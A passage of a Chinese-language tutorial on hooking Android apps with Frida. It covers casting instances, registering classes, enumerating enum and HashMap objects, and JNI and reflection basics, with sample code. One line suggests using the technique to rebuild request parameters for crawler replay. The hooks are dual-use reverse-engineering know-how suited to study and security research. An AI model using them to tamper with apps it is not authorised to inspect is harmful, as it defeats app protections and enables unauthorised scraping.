class="keyword">new</span>(Java.array(<span class="string">'char'</span>, [ <span class="string">'烟'</span>,<span class="string">'村'</span>,<span class="string">'四'</span>,<span class="string">'五'</span>,<span class="string">'家'</span>]))</span><br><span class="line">    <span class="keyword">return</span> newResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以用来构造参数重发包，用在爬虫上。</p><h3 id="类的多态：转型-Java-cast"><a href="#类的多态：转型-Java-cast" class="headerlink" title="类的多态：转型/Java.cast"></a>类的多态：转型/Java.cast</h3><p>可以通过<code>getClass().getName().toString()</code>来查看当前实例的类型。<br>找到一个instance，通过<code>Java.cast</code>来强制转换对象的类型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creates a JavaScript wrapper given the existing instance at `handle` of</span></span><br><span class="line"><span class="comment"> * given class `klass` as returned from `Java.use()`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param </span>handle An existing wrapper or a JNI handle.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param </span>klass Class wrapper for type to cast to.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cast</span>(<span class="params">handle: Wrapper | NativePointerValue, klass: Wrapper</span>): <span class="title">Wrapper</span>;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Water</span> </span>&#123; <span class="comment">// 水 类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">flow</span><span class="params">(Water W)</span> </span>&#123; <span class="comment">// 水 的方法</span></span><br><span class="line">        <span class="comment">// SomeSentence</span></span><br><span class="line">        Log.d(<span class="string">"2Object"</span>, <span class="string">"water flow: I`m flowing"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"water flow: I`m flowing"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">still</span><span class="params">(Water W)</span> </span>&#123; <span class="comment">// 水 的方法</span></span><br><span class="line">        <span class="comment">// SomeSentence</span></span><br><span class="line">        Log.d(<span class="string">"2Object"</span>, <span class="string">"water still: still water runs deep!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"water still: still water runs deep!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Juice</span> <span class="keyword">extends</span> <span class="title">Water</span> </span>&#123; <span class="comment">// 果汁 类 继承了水类</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">fillEnergy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"2Object"</span>, <span class="string">"Juice: i`m fillingEnergy!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Juice: i`m fillingEnergy!"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> JuiceHandle = <span class="literal">null</span> ;</span><br><span class="line">Java.choose(<span class="string">"com.r0ysue.a0526printout.Juice"</span>,&#123;</span><br><span class="line">    onMatch:<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"found juice instance"</span>,instance);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"juice instance call fill"</span>,instance.fillEnergy());</span><br><span class="line">        JuiceHandle = instance;</span><br><span class="line">    &#125;,<span class="attr">onComplete</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"juice handle search completed!"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Saved juice handle :"</span>,JuiceHandle);</span><br><span class="line"><span class="keyword">var</span> WaterHandle = Java.cast(JuiceHandle,Java.use(<span class="string">"com.r0ysue.a0526printout.Water"</span>))</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"call Waterhandle still method:"</span>,WaterHandle.still(WaterHandle));</span><br></pre></td></tr></table></figure><h3 id="interface-Java-registerClass"><a href="#interface-Java-registerClass" class="headerlink" title="interface/Java.registerClass"></a>interface/Java.registerClass</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">liquid</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">flow</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>frida提供能力去创建一个新的java class</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Creates a new Java class.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>spec Object describing the class to be created.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">registerClass</span>(<span class="params">spec: ClassSpec</span>): <span class="title">Wrapper</span>;</span></span><br></pre></td></tr></table></figure><p>首先获取要实现的interface，然后调用registerClass来实现interface。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> liquid = Java.use(<span class="string">"com.r0ysue.a0526printout.liquid"</span>);</span><br><span class="line">        <span class="keyword">var</span> beer = Java.registerClass(&#123;</span><br><span class="line">            name: <span class="string">'com.r0ysue.a0526printout.beer'</span>,</span><br><span class="line">            implements: [liquid],</span><br><span class="line">            methods: &#123;</span><br><span class="line">                flow: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">"look, beer is flowing!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">"look, beer is flowing!"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"beer.bubble:"</span>,beer.$<span class="keyword">new</span>().flow())      </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="成员内部类-匿名内部类"><a href="#成员内部类-匿名内部类" class="headerlink" title="成员内部类/匿名内部类"></a>成员内部类/匿名内部类</h3><p>看smali或者枚举出来的类。</p><h3 id="hook-enum"><a href="#hook-enum" class="headerlink" title="hook enum"></a>hook enum</h3><p>关于java枚举，从这篇文章了解。<br><a href="https://www.cnblogs.com/jingmoxukong/p/6098351.html" target="_blank" rel="noopener">https://www.cnblogs.com/jingmoxukong/p/6098351.html</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> Signal &#123;</span><br><span class="line">    GREEN, YELLOW, RED</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrafficLight</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Signal color = Signal.RED;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Log.d(<span class="string">"4enum"</span>, <span class="string">"enum "</span>+ color.getClass().getName().toString());</span><br><span class="line">        <span class="keyword">switch</span> (color) &#123;</span><br><span class="line">            <span class="keyword">case</span> RED:</span><br><span class="line">                color = Signal.GREEN;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> YELLOW:</span><br><span class="line">                color = Signal.RED;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> GREEN:</span><br><span class="line">                color = Signal.YELLOW;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.choose(<span class="string">"com.r0ysue.a0526printout.Signal"</span>,&#123;</span><br><span class="line">            onMatch:<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"instance.name:"</span>,instance.name());</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"instance.getDeclaringClass:"</span>,instance.getDeclaringClass());                </span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"search completed!"</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h3 id="打印hash-map"><a href="#打印hash-map" class="headerlink" title="打印hash map"></a>打印hash map</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.choose(<span class="string">"java.util.HashMap"</span>,&#123;</span><br><span class="line">            onMatch:<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(instance.toString().indexOf(<span class="string">"ISBN"</span>)!= <span class="number">-1</span>)&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">"instance.toString:"</span>,instance.toString());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"search complete!"</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h3 id="打印non-ascii"><a href="#打印non-ascii" class="headerlink" title="打印non-ascii"></a>打印non-ascii</h3><p><a href="https://api-caller.com/2019/03/30/frida-note/#non-ascii" target="_blank" rel="noopener">https://api-caller.com/2019/03/30/frida-note/#non-ascii</a><br>类名非ASCII字符串时，先编码打印出来, 再用编码后的字符串去 hook.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//场景hook cls.forName寻找目标类的classloader。</span></span><br><span class="line">    cls.forName.overload(<span class="string">'java.lang.String'</span>, <span class="string">'boolean'</span>, <span class="string">'java.lang.ClassLoader'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg1, arg2, arg3</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> clsName = cls.forName(arg1, arg2, arg3);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'oriClassName:'</span> + arg1)</span><br><span class="line">        <span class="keyword">var</span> base64Name = <span class="built_in">encodeURIComponent</span>(arg1)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'encodeName:'</span> + base64Name);</span><br><span class="line">        <span class="comment">//通过日志确认base64后的非ascii字符串，下面对比并打印classloader</span></span><br><span class="line">        <span class="comment">//clsName为特殊字符o.ÎÉ«</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'o.%CE%99%C9%AB'</span> == base64Name) &#123;</span><br><span class="line">            <span class="comment">//打印classloader</span></span><br><span class="line">            <span class="built_in">console</span>.log(arg3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clsName;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="Frida-native-hook-NDK开发入门"><a href="#Frida-native-hook-NDK开发入门" class="headerlink" title="Frida native hook : NDK开发入门"></a>Frida native hook : NDK开发入门</h2><p><a href="https://www.jianshu.com/p/87ce6f565d37" target="_blank" rel="noopener">https://www.jianshu.com/p/87ce6f565d37</a></p><ul><li>extern “C”与名称修饰<ul><li>通过c++filt工具可以直接还原得到原来的函数名</li><li><a href="https://zh.wikipedia.org/zh-hans/%E5%90%8D%E5%AD%97%E4%BF%AE%E9%A5%B0" target="_blank" rel="noopener">https://zh.wikipedia.org/zh-hans/%E5%90%8D%E5%AD%97%E4%BF%AE%E9%A5%B0</a></li><li>通过extern “C”导出的JNI函数不会被name mangling</li></ul></li><li>JNI参数与基本类型</li><li>第一个NDK程序<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-30-154643.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-30-155007.png" alt=""></li><li>JNI log<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TAG <span class="meta-string">"sakura1328"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGI(...) __android_log_print(ANDROID_LOG_INFO,TAG,__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGE(...) __android_log_print(ANDROID_LOG_ERROR,TAG,__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> JNIEXPORT jstring JNICALL</span><br><span class="line">Java_myapplication_example_com_ndk_1demo_MainActivity_stringFromJNI(</span><br><span class="line">        JNIEnv *env,</span><br><span class="line">        jobject <span class="comment">/* this */</span>) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> hello = <span class="string">"Hello from C++"</span>;</span><br><span class="line">    LOGD(<span class="string">"sakura1328"</span>);</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(hello.c_str());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="title">extends</span> <span class="title">AppCompatActivity</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">String</span> TAG = <span class="string">"sakura"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Used to load the 'native-lib' library on application startup.</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"native-lib"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Example of a call to a native method</span></span><br><span class="line">        TextView tv = (TextView) findViewById(R.id.sample_text);</span><br><span class="line">        tv.setText(stringFromJNI());</span><br><span class="line">        Log.d(TAG, stringFromJNI());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A native method that is implemented by the 'native-lib' native library,</span></span><br><span class="line"><span class="comment">     * which is packaged with this application.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> native <span class="keyword">String</span> <span class="title">stringFromJNI</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Frida-native-hook-JNIEnv和反射"><a href="#Frida-native-hook-JNIEnv和反射" class="headerlink" title="Frida native hook : JNIEnv和反射"></a>Frida native hook : JNIEnv和反射</h2><h3 id="以jni字符串来掌握基本的JNIEnv用法"><a href="#以jni字符串来掌握基本的JNIEnv用法" class="headerlink" title="以jni字符串来掌握基本的JNIEnv用法"></a>以jni字符串来掌握基本的JNIEnv用法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">stringWithJNI</span><span class="params">(String context)</span></span>;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">extern <span class="string">"C"</span></span><br><span class="line">JNIEXPORT jstring JNICALL</span><br><span class="line">Java_myapplication_example_com_ndk_1demo_MainActivity_stringWithJNI(JNIEnv *env, jobject instance,</span><br><span class="line">                                                                    jstring context_) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *context = env-&gt;GetStringUTFChars(context_, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> context_size = env-&gt;GetStringUTFLength(context_);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (context_size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        LOGD(<span class="string">"%s\n"</span>, context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    env-&gt;ReleaseStringUTFChars(context_, context);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(<span class="string">"sakura1328"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">22</span>:<span class="number">30</span>:<span class="number">00.548</span> <span class="number">15764</span>-<span class="number">15764</span>/myapplication.example.com.ndk_demo D/sakura1328: sakura</span><br></pre></td></tr></table></figure><h3 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h3><p>总结: 多去读一下java的反射API。</p><p><a href="https://www.jianshu.com/p/9be58ee20dee" target="_blank" rel="noopener">Java高级特性——反射</a></p><ul><li>查找调用各种API接口、JNI、frida/xposed原理的一部分</li><li>反射基本API</li><li>反射修改访问控制、修改属性值</li><li>JNI so调用反射进入java世界</li><li>xposed/Frida hook原理</li></ul><p>这里其实有一个伏笔，就是为什么我们要trace artmethod，hook artmethod是因为有些so混淆得非常厉害，然后也就很难静态分析看出so里面调用了哪些java函数，也不是通过类似JNI的GetMethodID这样来调用的。<br>而是通过类似findclass这种方法先得到类，然后再反射调用app里面的某个java函数。</p><p>所以去hook它执行的位置，每一个java函数对于Android源码而言都是一个artmethod结构体，然后hook拿到artmethod实例以后调用类函数，打印这个函数的名称。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">"sakura"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Used to load the 'native-lib' library on application startup.</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"native-lib"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Example of a call to a native method</span></span><br><span class="line">        TextView tv = (TextView) findViewById(R.id.sample_text);</span><br><span class="line">        tv.setText(stringWithJNI(<span class="string">"sakura"</span>));</span><br><span class="line"><span class="comment">//        Log.d(TAG, stringFromJNI());</span></span><br><span class="line"><span class="comment">//        Log.d(TAG, stringWithJNI("sakura"));</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            testClass();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testClass</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException </span>&#123;</span><br><span class="line">        Test sakuraTest = <span class="keyword">new</span> Test();</span><br><span class="line">        <span class="comment">// 获得Class的方法（三种）</span></span><br><span class="line">        Class testClazz = MainActivity.class.getClassLoader().loadClass("myapplication.example.com.ndk_demo.Test");</span><br><span class="line">        Class testClazz2 = Class.forName(<span class="string">"myapplication.example.com.ndk_demo.Test"</span>);</span><br><span class="line">        Class testClazz3 = Test<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        Log.i(TAG, <span class="string">"Classloader.loadClass-&gt;"</span> + testClazz);</span><br><span class="line">        Log.i(TAG, <span class="string">"Classloader.loadClass-&gt;"</span> + testClazz2);</span><br><span class="line">        Log.i(TAG, <span class="string">"Classloader.loadClass-&gt;"</span> + testClazz3.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得类中属性相关的方法</span></span><br><span class="line">        Field publicStaticField = testClazz3.getDeclaredField(<span class="string">"publicStaticField"</span>);</span><br><span class="line">        Log.i(TAG, <span class="string">"testClazz3.getDeclaredField-&gt;"</span> + publicStaticField);</span><br><span class="line"></span><br><span class="line">        Field publicField = testClazz3.getDeclaredField(<span class="string">"publicField"</span>);</span><br><span class="line">        Log.i(TAG, <span class="string">"testClazz3.getDeclaredField-&gt;"</span> + publicField);</span><br><span 